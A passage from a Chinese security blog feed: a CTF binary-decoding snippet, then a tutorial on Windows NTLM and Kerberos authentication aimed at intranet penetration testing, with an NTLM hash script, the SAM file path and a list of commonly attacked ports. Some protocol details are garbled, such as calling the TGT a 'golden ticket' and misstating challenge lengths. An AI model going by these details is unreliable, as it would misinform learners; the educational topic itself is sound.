operator">+</span> <span class="token builtin">sum</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="13"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"flag&#123;"</span><span class="token operator">+</span>flag<span class="token operator">+</span><span class="token string">"&#125;"</span><span class="token punctuation">)</span></pre></td></tr></table></figure><h2 id="二进制转十进制"><a class="anchor" href="#二进制转十进制">#</a> 二进制转十进制</h2>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre>ciphertxt <span class="token operator">=</span><span class="token string">"01000100010100110111100100110011010010100111100101001011011101100101000001000011010100000110110101001000001101000101011101000011011110100010101101010100011010000101011101101001001100100100011001100111010010110110111100111001011001010101001101010000010101010011010001100101001101010110011100101011011010100101101001010101001100110100011001110010010101110100111001110110010011000100110100110101001101010110101101000101011001100011000101101000010001010110110101001110011100100111010100101011010011100100010100110011"</span></pre></td></tr><tr><td data-num="2"></td><td><pre>m <span class="token operator">=</span> <span class="token string">" "</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>ciphertxt<span class="token punctuation">[</span>i<span class="token punctuation">:</span>i<span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>ciphertxt<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>windows认证系列和域前置的简单了解</title>
    <url>/article/64fd8041.html</url>
    <content><![CDATA[<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211126131916790.png" alt="image-20211126131916790" /></p>
<h3 id="00x01windows之ntlm认证"><a class="anchor" href="#00x01windows之ntlm认证">#</a> 00x01.Windows 之 NTLM 认证</h3>
<p>NTLM 认证主要有本地认证和网络认证两种方式</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>本地登陆时用户密码存储在<span class="token constant">SAM</span>文件中，可以把它当作一个存储密码的数据库，所有的操作都在本地进行的。它将用户输入的密码转换为<span class="token constant">NTLM</span> Hash<span class="token punctuation">,</span>然后与<span class="token constant">SAM</span>中的<span class="token constant">NTLM</span> Hash进行比较。</pre></td></tr><tr><td data-num="2"></td><td><pre>网络认证则是基于一种Challenge<span class="token operator">/</span>Response认证机制的认证模式。</pre></td></tr></table></figure><p>windows 本地认证基础知识</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>在本地登陆的情况下，操作系统会使用用户输入的密码作为凭据去与系统中的密码进行校验，如果成功的话表明验证通过。</pre></td></tr><tr><td data-num="2"></td><td><pre>操作系统的密码存储在<span class="token constant">C</span>盘的目录下：<span class="token operator">%</span>SystemRoot<span class="token operator">%</span>\system32\config\sam</pre></td></tr></table></figure><p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211126130422489.png" alt="image-20211126130422489" /></p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token constant">SAM</span>用于储存本地所有用户的凭证信息，但是这并不代表着你可以随意去查看系统密码。我们登陆系统的时候系统会自动读取<span class="token constant">SAM</span>文件中的密码与我们输入的密码进行比对，如果认证相同则可以使用该机器。</pre></td></tr><tr><td data-num="2"></td><td><pre>windows自身是不会保存明文密码的，也就是说<span class="token constant">SAM</span>中保存的不是明文而是Hash。</pre></td></tr></table></figure><h4 id="ntlm的认证过程"><a class="anchor" href="#ntlm的认证过程">#</a> NTLM 的认证过程</h4>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token constant">NTLM</span> Hash是怎么样生成的呢？当用户注销、重启、锁屏后，操作系统会让winlogon显示登陆界面，当winlogon<span class="token punctuation">.</span>exe接收到账号密码输入之后，会将密码交给lsass进程，这个进程会存一份明文密码，将明文密码加密成<span class="token constant">NTLM</span> Hash，对<span class="token constant">SAM</span><span class="token function">数据库比较认证。</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token punctuation">(</span>winlogon<span class="token punctuation">.</span>exe即Windows Logon Process，是Windows <span class="token constant">NT</span>用户登陆程序，用于管理用户登录和退出。<span class="token constant">LSASS</span>用于微软Windows系统的安全机制。它用于本地安全和登陆策略。<span class="token punctuation">)</span></pre></td></tr></table></figure><p>比如当用户输入密码 <code>admin</code>  的时候，操作系统会将 <code>admin转换为16进制</code> ，经过 <code>Unicode转换</code> 后，再调用 <code>MD4加密算法加密</code> ，这个加密结果的 <code>十六进制</code> 就是 <code>NTLM Hash</code></p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>admin <span class="token operator">-</span><span class="token operator">></span> <span class="token function">hex</span><span class="token punctuation">(</span><span class="token number">16</span>进制编码<span class="token punctuation">)</span> <span class="token operator">=</span> 61646d696e</pre></td></tr><tr><td data-num="2"></td><td><pre>61646d696e <span class="token operator">-</span><span class="token operator">></span> Unicode <span class="token operator">=</span> 610064006d0069006e00</pre></td></tr><tr><td data-num="3"></td><td><pre>610064006d0069006e00 <span class="token operator">-</span><span class="token operator">></span> <span class="token constant">MD4</span> <span class="token operator">=</span> 209c6174da490caeb422f3fa5a7ae634</pre></td></tr></table></figure><p>加密脚本：</p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">import</span> hashlib</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">import</span> binascii</pre></td></tr><tr><td data-num="3"></td><td><pre></pre></td></tr><tr><td data-num="4"></td><td><pre>Description <span class="token operator">=</span> <span class="token triple-quoted-string string">'''</pre></td></tr><tr><td data-num="5"></td><td><pre>NTLM计算过程</pre></td></tr><tr><td data-num="6"></td><td><pre>admin -> hex = 61646d696e</pre></td></tr><tr><td data-num="7"></td><td><pre>61646d696e-> Unicode = 610064006d0069006e00</pre></td></tr><tr><td data-num="8"></td><td><pre>610064006d0069006e00 -> MD4 = 209c6174da490caeb422f3fa5a7ae634</pre></td></tr><tr><td data-num="9"></td><td><pre>'''</span></pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span>Description<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="11"></td><td><pre>Password <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">'Your Password:'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="12"></td><td><pre><span class="token builtin">hash</span> <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>new<span class="token punctuation">(</span><span class="token string">'md4'</span><span class="token punctuation">,</span>Password<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-16le'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>digest<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="13"></td><td><pre>hash_hex <span class="token operator">=</span> binascii<span class="token punctuation">.</span>hexlify<span class="token punctuation">(</span><span class="token builtin">hash</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'->'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>hash_hex<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span></pre></td></tr></table></figure><h4 id="本地认证的流程"><a class="anchor" href="#本地认证的流程">#</a> 本地认证的流程</h4>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>winlogon<span class="token punctuation">.</span>exe <span class="token operator">-</span><span class="token operator">></span> 接收用户输入 <span class="token operator">-</span><span class="token operator">></span> lsass<span class="token punctuation">.</span>exe <span class="token operator">-</span><span class="token operator">></span> <span class="token punctuation">(</span>认证<span class="token punctuation">)</span></pre></td></tr></table></figure><p><code>Windows Logon Process(即 winlogon.exe)</code> ，是 <code>Windows NT</code>  用户登 陆程序，用于管理用户登录和退出。</p>
<p><code>LSASS</code>  用于微软 Windows 系统的安全机 制。它用于本地安全和登陆策略。</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211126130927563.png" alt="image-20211126130927563" /></p>
<h4 id="windows网络认证"><a class="anchor" href="#windows网络认证">#</a> <strong>windows 网络认证</strong></h4>
<p>在工作组中，无论是局域网中的一台机器还是很多机器，它们能够通信的话都无法相互建立一个完美的信任机制。只要有一个可以信任的信托机构，对两方进行认证，这样就有第三方来证实双方的可信任性。</p>
<p>在了解认证之前先了解一些 SMB 协议：</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token constant">SMB</span>（ServerMessage <span class="token function">Block）通信协议是微软（Microsoft）和英特尔</span><span class="token punctuation">(</span>Intel<span class="token punctuation">)</span>在<span class="token number">1987</span>年制定的协议，主要是作为Microsoft网络的通讯协议。<span class="token constant">SMB</span> 是在会话层（session layer）和表示层（presentation layer）以及小部分应用层（application layer）的协议。<span class="token constant">SMB</span>使用了NetBIOS的应用程序接口 （Application Program Interface，简称<span class="token constant">API</span>），一般端口使用为<span class="token number">139</span>，<span class="token number">445</span>。另外，它是一个开放性的协议，允许了协议扩展——使得它变得更大而且复杂；大约有<span class="token number">65</span>个最上层的作业，而每个作业都超过<span class="token number">120</span>个函数，甚至Windows <span class="token constant">NT</span>也没有全部支持到，最近微软又把 <span class="token constant">SMB</span> 改名为 <span class="token constant">CIFS</span>（CommonInternet File System），并且加入了许多新的特色。</pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre>早期<span class="token constant">SMB</span>协议在网络上传输的是明文口令。后来出现<span class="token constant">LAN</span> Manager ChallengeReponse 验证机制，简称<span class="token constant">LM</span>。</pre></td></tr><tr><td data-num="4"></td><td><pre>微软提出了windowsNT挑战<span class="token operator">/</span>响应验证机制，简称<span class="token constant">MTLM</span>。现在已经更新到了<span class="token constant">V2</span>版本以及加入了Kerberos验证体系</pre></td></tr></table></figure><h4 id="ntlm-协议"><a class="anchor" href="#ntlm-协议">#</a> <strong>NTLM 协议</strong></h4>
<p>NTLM 是一种网络认证协议，它是基于 <code>挑战（Chalenge）/响应（Response）</code> 认证机制的一种认证模式。(这个协议只支持 Windows)</p>
<p>NTLM 协议的认证共需要三个消息完成：协商 --&gt; 挑战 --&gt; 认证。</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>协商：主要用于确认双方协议版本、加密等级等</pre></td></tr><tr><td data-num="2"></td><td><pre>挑战：服务器在收到客户端的协商消息之后， 会读取其中的内容，并从中选择出自己所能接受的服务内容，加密等级，安全服务等等。并生成一个随机数challenge<span class="token punctuation">,</span> 然后生成challenge消息返回给客户端。该消息就是挑战<span class="token operator">/</span>响应认证机制的主要功能体现。</pre></td></tr><tr><td data-num="3"></td><td><pre>认证：验证主要是在挑战完成后，验证结果，是认证的最后一步。</pre></td></tr></table></figure><p>质询的完整过程：</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">1.</span><span class="token function">客户端向服务器端发送用户信息</span><span class="token punctuation">(</span>用户名<span class="token punctuation">)</span>请求</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token number">2.</span>服务器接受到请求，生成一个<span class="token number">16</span>位的随机数，被称之为“Challenge”， 使用登录用户名对应的<span class="token constant">NTLM</span> <span class="token function">Hash加密Challenge</span><span class="token punctuation">(</span><span class="token number">16</span>位随机字符<span class="token punctuation">)</span>， <span class="token function">生成Challenge1。同时，生成Challenge1后，将Challenge</span><span class="token punctuation">(</span><span class="token number">16</span>位随机 字符<span class="token punctuation">)</span>发送给客户端。</pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token number">3.</span>客户端接受到Challenge后，使用将要登录到账户对应的<span class="token constant">NTLM</span> Hash加密Challenge生成Response，然后将Response发送至服务器端。</pre></td></tr></table></figure><p>其中，经过 NTLM Hash 加密 Challenge 的结果在网络协议中称之为 Net NTLM Hash。</p>
<p>验证：服务器端收到客户端的 Response 后，比对 Chanllenge1 与 Response 是否相等，若相等，则认证通过。</p>
<p><strong>详细过程：</strong></p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">1</span><span class="token punctuation">.</span>Server接收到Client发送的用户名后，判断本地账户列 表是否有用户名share_user 如果没有，返回认证失败 如果有，生成Chanllenge，并且从本地查找share_user对 应的<span class="token constant">NTLM</span> Hash，使用<span class="token constant">NTLM</span> Hash加密Chanllenge，生成一 个Net<span class="token operator">-</span><span class="token constant">NTLM</span> Hash存在内存中，并将Chanllenge发送给Client。</pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token number">2</span><span class="token punctuation">.</span>Client接收到Chanllenge后，将自己提供的share_user的密码转换为<span class="token constant">NTLM</span> Hash，使用<span class="token constant">NTLM</span> Hash加密Chanllenge， 这个结果叫Response，表现形式是Net<span class="token operator">-</span><span class="token constant">NTLM</span> Hash，最后将Response发送给Server。</pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token number">3</span><span class="token punctuation">.</span>Server接收到Client发送的Response，将Response与之 前的Net<span class="token operator">-</span><span class="token constant">NTLM</span> Hash进行比较，如果相等，则认证通过。</pre></td></tr><tr><td data-num="6"></td><td><pre></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token literal-property property">注意</span><span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">.</span>Chanllenge是Server产生的一个<span class="token number">16</span>字节的随机数，每次认证都不同 <span class="token number">2</span><span class="token punctuation">.</span>Response的表现形式是Net<span class="token operator">-</span><span class="token constant">NTLM</span> Hash，它是由客户端 提供的密码Hash加密Server返回的Chanllenge产生的结果。</pre></td></tr></table></figure><p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211126132012656.png" alt="image-20211126132012656" /></p>
<p><strong>NTLM 协议 V1 与 V2 的区别</strong></p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token constant">NTLM</span> v1与<span class="token constant">NTLM</span> v2最显著的区别就是Challenge与加密算法不同，共同点就是加密的原料都是<span class="token constant">NTLM</span> Hash。</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token literal-property property">Challage</span><span class="token operator">:</span><span class="token constant">NTLM</span> v1的Challenge有<span class="token number">8</span>位，<span class="token constant">NTLM</span> v2的Challenge为<span class="token number">16</span>位。</pre></td></tr><tr><td data-num="3"></td><td><pre>Net<span class="token operator">-</span><span class="token constant">NTLM</span> <span class="token literal-property property">Hash</span><span class="token operator">:</span><span class="token constant">NTLM</span> v1的主要加密算法是<span class="token constant">DES</span>，<span class="token constant">NTLM</span> v2的主要加密算法是<span class="token constant">HMAC</span><span class="token operator">-</span><span class="token constant">MD5</span>。</pre></td></tr></table></figure><h4 id="内网渗透常用端口"><a class="anchor" href="#内网渗透常用端口">#</a> <strong>内网渗透常用端口</strong></h4>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">53</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token constant">DNS</span>服务，在使用中需要用到<span class="token constant">TCP</span><span class="token operator">/</span><span class="token constant">UDP</span> <span class="token number">53</span>端口，<span class="token constant">AD</span>域的核心就是<span class="token constant">DNS</span>服务器，<span class="token constant">AD</span>通过<span class="token constant">DNS</span>服务器定位资源</pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token number">88</span></pre></td></tr><tr><td data-num="4"></td><td><pre>Kerberos服务，在使用中需要用到<span class="token constant">TCP</span><span class="token operator">/</span><span class="token constant">UDP</span> <span class="token number">88</span><span class="token function">端口，Kerberos密钥分发中心</span><span class="token punctuation">(</span><span class="token constant">KDC</span><span class="token punctuation">)</span> 在该端口上侦听Ticket请求</pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token number">135</span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token number">135</span>端口主要用于使用<span class="token constant">RPC</span>协议并提供<span class="token constant">DCOM</span>服务。</pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token number">137</span></pre></td></tr><tr><td data-num="8"></td><td><pre>NetBIOS<span class="token operator">-</span><span class="token constant">NS</span><span class="token punctuation">(</span>名称服务<span class="token punctuation">)</span>，在使用中需要用到<span class="token constant">TCP</span><span class="token operator">/</span><span class="token constant">UDP</span> <span class="token number">137</span>端口</pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token number">139</span></pre></td></tr><tr><td data-num="10"></td><td><pre>Session <span class="token function">Server</span><span class="token punctuation">(</span>会话服务<span class="token punctuation">)</span><span class="token punctuation">,</span>在使用中需要用到<span class="token constant">TCP</span><span class="token operator">/</span><span class="token constant">UDP</span> <span class="token number">139</span>端口，允许两台计算机建立连接</pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token number">389</span></pre></td></tr><tr><td data-num="12"></td><td><pre><span class="token constant">LDAP</span><span class="token function">服务</span><span class="token punctuation">(</span>轻量级目录访问协议<span class="token punctuation">)</span>，在使用中需要用到<span class="token constant">TCP</span><span class="token operator">/</span><span class="token constant">UDP</span> <span class="token number">389</span>端口，如果需要使用<span class="token constant">SSL</span>，需要使用<span class="token number">636</span>端口，</pre></td></tr><tr><td data-num="13"></td><td><pre><span class="token number">445</span></pre></td></tr><tr><td data-num="14"></td><td><pre>主要用于共享文件夹或共享打印，存在较多漏洞，如<span class="token constant">MS08</span><span class="token operator">-</span><span class="token number">067</span>、<span class="token constant">MS17</span><span class="token operator">-</span><span class="token number">010</span></pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token number">3268</span> Global <span class="token function">Catalog</span><span class="token punctuation">(</span>全局编录服务器<span class="token punctuation">)</span>，如果需要使用<span class="token constant">SSL</span>，需要用到<span class="token number">3269</span>端口，主要用于用户登录时，负责验证用户身份的域控制器需要通过防火</pre></td></tr><tr><td data-num="16"></td><td><pre>墙，来向“全局编录”查询用户所隶属的通用组</pre></td></tr></table></figure><h4 id="ntlm身份验证"><a class="anchor" href="#ntlm身份验证">#</a> NTLM 身份验证</h4>
<p>NTLM 验证是一种 Challenge/Response 验证机制，由三种消息组成：通常称为 type 1 (协商)，类型 type 2 (质询) 和 type 3 (身份验证)。</p>
<p>它基本上是这样工作的:</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211126132650233.png" alt="image-20211126132650233" /></p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">1.</span> 用户登录客户端电脑</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token number">2.</span> <span class="token punctuation">(</span>type <span class="token number">1</span><span class="token punctuation">)</span>客户端向服务器发送type <span class="token number">1</span><span class="token punctuation">(</span>协商<span class="token punctuation">)</span>消息<span class="token punctuation">,</span>它主要包含客户端支持和服务器请求的功能列表。</pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token number">3.</span> <span class="token punctuation">(</span>type <span class="token number">2</span><span class="token punctuation">)</span>服务器用type <span class="token number">2</span><span class="token function">消息</span><span class="token punctuation">(</span>质询<span class="token punctuation">)</span>进行响应，这包含服务器支持和同意的功能列表。但是，最重要的是，它包含服务器产生的Challenge。</pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token number">4.</span> <span class="token punctuation">(</span>type <span class="token number">3</span><span class="token punctuation">)</span>客户端用type <span class="token number">3</span><span class="token function">消息</span><span class="token punctuation">(</span>身份验证<span class="token punctuation">)</span>回复质询。用户接收到步骤<span class="token number">3</span>中的challenge之后，使用用户hash与challenge进行加密运算得到response，将response<span class="token punctuation">,</span>username<span class="token punctuation">,</span>challeng发给服务器。消息中的response是最关键的部分，因为它们向服务器证明客户端用户已经知道帐户密码。</pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token number">5.</span> 服务器拿到type <span class="token number">3</span>之后，使用challenge和用户hash进行加密得到response2与type <span class="token number">3</span>发来的response进行比较。如果用户hash是存储在域控里面的话，那么没有用户hash，也就没办法计算response2。也就没法验证。这个时候用户服务器就会通过netlogon协议联系域控，建立一个安全通道<span class="token punctuation">,</span>然后将type <span class="token number">1</span><span class="token punctuation">,</span>type <span class="token number">2</span>，type3 <span class="token function">全部发给域控</span><span class="token punctuation">(</span>这个过程也叫作Pass Through Authentication认证流程<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token number">6.</span> 域控使用challenge和用户hash进行加密得到response2，与type <span class="token number">3</span>的response进行比较</pre></td></tr></table></figure><p>下面简单介绍下三个过程，如果对于细节不感兴趣的话就可以忽略。</p>
<p><strong>type 1 协商</strong></p>
<p>这个过程是客户端向服务器发送 type 1 (协商) 消息，它主要包含客户端支持和服务器请求的功能列表。</p>
<p>主要包含以下结构</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211126132807866.png" alt="image-20211126132807866" /></p>
<p>抓包查看对应的信息如下</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211126132832171.png" alt="image-20211126132832171" /></p>
<p><strong>type 2 质询</strong></p>
<p>这个过程是服务器用 type 2 消息 (质询) 进行响应，这包含服务器支持和同意的功能列表。但是，最重要的是，它包含服务器产生的 Challenge。</p>
<p>主要 包含以下结构</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211126132903616.png" alt="image-20211126132903616" /></p>
<p><strong>type 3 身份验证</strong></p>
<p>这个过程客户端接收到 challenge 之后，使用用户 hash 与 challenge 进行加密运算得到 response，将 response,username,challenge 发给服务器。消息中的 response 是最关键的部分，因为它向服务器证明客户端用户已经知道帐户密码。</p>
<p>主要包含以下结构</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211126133114164.png" alt="image-20211126133114164" /></p>
<p>这里的 Challeng 不同于 type2 的 Challenge，这里的 Challenge 是一个随机的客户端 nonce。</p>
<p>MIC 是校验和，设计 MIC 主要是为了防止这个包中途被修改</p>
<p>sessionkey 是在要求进行签名的时候用的，用来进行协商加密密钥，可能有些文章会说 sessionkey 就是加密密钥，需要拥有用户 hash 才能计算出来，因此攻击者算不出来，就无法加解密包。但是想想就不可能，这个 session_key 已经在流量里面明文传输，那攻击者拿到之后不就可以直接加解密包了。当然这是后话，后面讲签名的时候会详细讲讲这个问题。</p>
<h3 id="00x02windows之kerberos认证"><a class="anchor" href="#00x02windows之kerberos认证">#</a> 00x02.Windows 之 Kerberos 认证</h3>
<h4 id="域认证kerberos"><a class="anchor" href="#域认证kerberos">#</a> 域认证 Kerberos</h4>
<p>域内认证不再是两台机器之间互相请求认证，而是通过第三方可信机构 KDC（Key Distribute Center）来实现整个认证体系</p>
<h4 id="系统角色"><a class="anchor" href="#系统角色">#</a> 系统角色</h4>
<p>参与域认证的三个角色：</p>
<ul>
<li>Client</li>
<li>Server</li>
<li>KDC(Key Distribution Center) = AD（Account Database）+ AS（Authenication Service）+ TGS（Ticket Granting Service）</li>
</ul>
<p>从物理层面看，KDC 的角色实际为域控制器 (Domain Controller)，其中包含 AD 数据库与 AS 服务，TGS 服务。</p>
<h4 id="kerberos相关的几个概念"><a class="anchor" href="#kerberos相关的几个概念">#</a> Kerberos 相关的几个概念：</h4>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token constant">KDC</span><span class="token punctuation">(</span>Key Distribution Center<span class="token punctuation">)</span><span class="token operator">:</span>密钥分发中心</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token constant">AS</span><span class="token punctuation">(</span>Authentication Server<span class="token punctuation">)</span><span class="token operator">:</span>身份认证服务</pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token constant">TGT</span><span class="token punctuation">(</span>Ticket Granting Ticket<span class="token punctuation">)</span>：由<span class="token constant">AS</span>身份认证服务提供的票据也称为黄金票据，用于身份认证，存储在内存，默认有效期为<span class="token number">10</span>小时。</pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token constant">TGS</span><span class="token punctuation">(</span>Ticket Granting Server<span class="token punctuation">)</span>：由<span class="token constant">TGS</span>服务提供的票据也称为白银票据，用于发出所请求服务的票证。</pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token constant">AD</span>，全称叫Account Database，被称作活动目录数据库，存放在域控<span class="token constant">NTDS</span><span class="token punctuation">.</span><span class="token constant">DIT</span>文件中，存储域中所有用户的用户名和对应的<span class="token constant">NTLM</span> Hash，<span class="token constant">KDC</span>可以从<span class="token constant">AD</span>中提取域中所有用户的<span class="token constant">NTLM</span> Hash，这是Kerberos协议能够成功实现的基础。</pre></td></tr><tr><td data-num="6"></td><td><pre></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token constant">AS</span>，全称叫Authenication Service，是<span class="token constant">KDC</span>的组件之一，处理初始请求并负责发出<span class="token constant">TGT</span>给Client，用来完成对Client的身份验证。</pre></td></tr><tr><td data-num="8"></td><td><pre></pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token constant">TGS</span>，全称叫Ticket Granting Service，也是<span class="token constant">KDC</span>的组件之一，从<span class="token constant">AS</span>那里拿到<span class="token constant">TGT</span>之后，<span class="token constant">TGS</span>再发出对某个特定服务或服务器访问的Ticket，这个Ticket允许对某个服务访问。</pre></td></tr></table></figure><h4 id="kerbreros认证流程"><a class="anchor" href="#kerbreros认证流程">#</a> Kerbreros 认证流程</h4>
<p>下图显示了 Client、Server、KDC 三者的协议交互过程。</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211126152356684.png" alt="image-20211126152356684" /></p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>Client向<span class="token constant">KDC</span>发起服务请求，希望获取访问Server的权限。 <span class="token constant">KDC</span>得到了这个消息，首先得判断Client是否是可信赖的， 也就是从<span class="token constant">AD</span>数据库中寻找该用户是否可用来登录。这就是<span class="token constant">AS</span>服务完成的工作，成功后，<span class="token constant">AS</span>返回<span class="token constant">TGT</span>给Client。</pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre>Client得到了<span class="token constant">TGT</span>后，继续向<span class="token constant">KDC</span>请求，希望获取访问Server的权限。<span class="token constant">KDC</span>又得到了这个消息，这时候通过Client 消息中的<span class="token constant">TGT</span>，判断出了Client拥有了这个权限，给了Client访问Server的权限Ticket。（<span class="token constant">TGS</span>服务的任务）</pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre>Client得到Ticket后便可以使用这个Ticket成功访问Server。但是这个Ticket只能用来访问这个Server，如果要访问其他Server需要向<span class="token constant">KDC</span>重新申请。</pre></td></tr></table></figure><h5 id="具体过程"><a class="anchor" href="#具体过程">#</a> 具体过程</h5>
<h5 id="1-用户登陆"><a class="anchor" href="#1-用户登陆">#</a> 1、用户登陆</h5>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211126152655700.png" alt="image-20211126152655700" /></p>
<ul>
<li>用户输入 <strong>用户名</strong> 和 <strong>密码</strong> 信息</li>
<li>在客户端，用户输入的 <strong>密码</strong> 通过计算生成 NTLM 哈希作做为 <strong>CLIENT 密钥</strong></li>
</ul>
<h5 id="2-身份认证服务as认证流程"><a class="anchor" href="#2-身份认证服务as认证流程">#</a> 2、身份认证服务（AS）认证流程</h5>
<h6 id="21-客户端向as发送认证请求"><a class="anchor" href="#21-客户端向as发送认证请求">#</a> 2.1 客户端向 AS 发送认证请求</h6>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211126153013290.png" alt="image-20211126153013290" /></p>
<ul>
<li>客户端向 AS 发送带有明文 <strong>用户名</strong> 的认证请求</li>
</ul>
<h6 id="22-as确认client端登录者用户身份"><a class="anchor" href="#22-as确认client端登录者用户身份">#</a> 2.2 AS 确认 Client 端登录者用户身份</h6>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211126153052593.png" alt="image-20211126153052593" /></p>
<p>1、AS 从 AD 数据库中查找该用户是否存在。<br />
2、如果该 <strong>用户名</strong> 存在，则 AS 使用用户密码生成密钥，然后对响应消息<strong> Msg A</strong> 进行加密。如果找不到，则将错误消息返回给客户端。<br />
3、AS 使用 TGS 密钥对<strong> Msg B</strong> 进行加密。<br />
4、AS 将<strong> Msg A</strong> 和<strong> Msg B</strong> 返回给客户端。<br />
5、客户端使用用户的密钥解密 <strong>Msg A</strong>。请注意，客户端无法解密 <strong>Msg B</strong>。</p>
<ul>
<li>
